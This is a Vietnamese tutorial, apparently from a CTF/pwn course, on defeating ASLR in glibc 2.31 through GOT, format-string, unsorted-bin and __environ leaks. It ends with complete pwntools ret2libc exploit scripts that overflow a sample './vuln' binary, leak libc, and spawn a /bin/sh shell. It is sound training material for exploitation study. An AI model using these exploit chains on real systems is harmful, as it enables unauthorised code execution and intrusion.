Leak Techniques

ASLR random hóa base libc/stack/heap mỗi lần chạy — nhưng offset nội bộ cố định. Nên chỉ cần leak một địa chỉ là suy ra cả vùng. Bài này tổng hợp các cách leak có số thật glibc 2.31: GOT (puts/write), format string, unsorted bin, __environ (leak stack).

Bài này nói về cái gì?

Nguyên lý: leak 1 địa chỉ bất kỳ trong một vùng (libc/stack/heap/elf) → base = leak − offset → biết mọi địa chỉ trong vùng đó.

Leak libc: in địa chỉ thật của một hàm (từ GOT) hoặc con trỏ libc (unsorted fd). libc.base = leak − libc.sym.hàm.

Leak stack: đọc __environ trong libc (chứa con trỏ stack) → biết địa chỉ stack để ghi ret. Leak heap: tcache fd / con trỏ heap in ra.

Nếu chỉ nhớ một điều: leak = một địa chỉ rò ra; base = leak − offset. Chọn nguồn leak theo primitive bạn có.

⚡ COMBAT CARD — chọn leak theo thứ bạn có
💧 Leak libc — có hàm in (puts/printf) 
ROP: pop_rdi; puts@got; puts@plt   # in địa chỉ thật của puts
libc.base = leak - libc.sym.puts   # 2.31: - 0x875a0
💧 Leak libc — format string 
%21$p → 0x7ffff7dcf083 (__libc_start_main+243)
libc.base = leak - 0x24083
💧 Leak libc — heap/unsorted 
free chunk lớn → unsorted → UAF read fd = libc+0x1ecbe0
libc.base = fd - 0x1ecbe0
🧵 Leak STACK — __environ 
# sau khi có libc: đọc *(libc.sym.environ) = một địa chỉ stack
# ret_addr ≈ environ_val - offset (đo bằng gdb)
⚠️ Quy tắc

Base luôn kết thúc 000. Leak dùng libc của ĐỀ (patchelf) → offset đúng. Kết thúc leak bằng quay lại hàm có overflow để tấn công giai đoạn 2.

01 / NỀN TẢNG BẮT BUỘC

ASLR & offset cố định

ASLR random hóa base của mỗi vùng nhớ (libc, stack, heap, và PIE binary) mỗi lần chạy. Nhưng bố cục bên trong mỗi vùng không đổi: hàm system luôn cách đầu libc một offset cố định. Nên biết một địa chỉ thật trong libc là đủ tính base, rồi suy ra mọi địa chỉ. GOT (Global Offset Table) chứa địa chỉ thật của các hàm libc đã được resolve — đọc GOT = leak.

Định nghĩa nhanh

leak

In/đọc một địa chỉ thật để phá ASLR.

offset

Khoảng cách cố định từ base tới hàm.

GOT

Bảng địa chỉ thật của hàm (sau resolve).

__environ

Biến libc chứa con trỏ stack → leak stack.

rebase

base = leak − offset.

libc.sym

pwntools: offset hàm trong libc.

02 / VÌ SAO CÓ KỸ THUẬT

Leak là chìa khóa mở ASLR

Hầu hết khai thác hiện đại cần 2 thành phần: leak (biết địa chỉ) + control (ghi/nhảy). Mọi mitigation (ASLR, PIE, canary) đều có thể vượt nếu leak đủ: leak libc → ret2libc; leak PIE → biết gadget; leak canary → bỏ qua stack-smashing check; leak stack → ghi ret trực tiếp. Thành thạo "lấy leak từ primitive mình có" là kỹ năng nền của Phase 2 trở đi.

03 / GOT LEAK · MỤC LÕI

puts(puts@got) / write(1, got, 8)

Hai cách (số thật 2.31)

# puts: dừng ở null byte — địa chỉ libc thường không có null → OK
ROP: pop_rdi(0x401263); puts@got(0x404018); puts@plt(0x401064); main
leak = u64(recvline()[:8])          # = 0x7ffff7e475a0
libc.address = leak - 0x875a0       # libc.sym.puts

# write: in CHÍNH XÁC n byte (không dừng null) — tốt hơn puts khi địa chỉ có null
ROP: write(1, puts@got, 8)          # cần set rdi=1,rsi=got,rdx=8 (ret2csu?)
puts vs writeputs dừng ở byte null → nếu địa chỉ cần leak có null giữa chừng, bị cắt. write(1, addr, 8) in đủ 8 byte (cần set rdx=8 — dùng ret2csu nếu thiếu pop rdx). Với libc address (0x7f...) thường không có null ở 6 byte đầu nên puts OK.

07 / EXPLOIT ĐẦY ĐỦ

GOT leak → ret2libc (số thật 2.31)

# BẢN A — leak libc qua puts(puts@got), rebase, rồi system.
from pwn import *
exe  = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = process(exe.path)

OFF = 72; pop_rdi = 0x401263; ret = 0x40101a
# G1: leak
p.send(b"A"*OFF + flat(pop_rdi, exe.got.puts, exe.plt.puts, exe.sym.main))
leak = u64(p.recvline().strip().ljust(8,b"\x00"))
libc.address = leak - libc.sym.puts      # leak - 0x875a0
assert libc.address & 0xfff == 0
log.success(f"libc = {hex(libc.address)}")
# G2: system("/bin/sh")
binsh = next(libc.search(b"/bin/sh"))
p.send(b"A"*OFF + flat(ret, pop_rdi, binsh, libc.sym.system))
p.interactive()
Thành thậtOFF=72, pop_rdi=0x401263, ret=0x40101a là của binary mẫu. Offset 0x875a0 là libc.sym.puts 2.31 — dùng libc.sym để robust. puts dừng null nên libc leak (0x7f…) OK.
# BẢN B — có libc rồi, leak STACK qua __environ để ghi ret trực tiếp.
from pwn import *
# ... đã có libc.address (từ bản A) và một arbitrary-read (vd puts/fmt) ...
def leak_mem(addr):
    p.send(b"A"*OFF + flat(pop_rdi, addr, exe.plt.puts, exe.sym.main))
    return u64(p.recvline().strip().ljust(8,b"\x00"))

env  = leak_mem(libc.sym.environ)         # con trỏ stack = 0x7fffffffe3a8
ret_slot = env - 0x130                   # offset đo bằng gdb → saved RIP của hàm vuln
log.success(f"stack ret @ {hex(ret_slot)}")
# → giờ có thể ghi ROP vào ret_slot (nếu có arbitrary write)
p.interactive()
Leak chuỗiDùng puts(addr) như "hàm đọc bộ nhớ" tùy ý: mỗi lần leak 1 địa chỉ, quay main. Leak environ → stack. Kết hợp arbitrary-write → ghi ret.
# BẢN C — pwnld.
from pwnld import *
context.binary = exe = ELF("./vuln", checksec=False); libc = get_libc("./libc.so.6")
p = start(); OFF=72; pop_rdi=0x401263; ret=0x40101a
sl(b"A"*OFF + flat(pop_rdi, exe.got.puts, exe.plt.puts, exe.sym.main))
rebase_libc(leak=u64(rl().strip().ljust(8,b"\x00")), sym="puts")
sl(b"A"*OFF + flat(ret, pop_rdi, next(LIBC.search(b"/bin/sh")), LIBC.sym.system))
ia()
pwnldrebase_libc(leak, sym="puts") = base = leak − LIBC.sym.puts. Gọn.
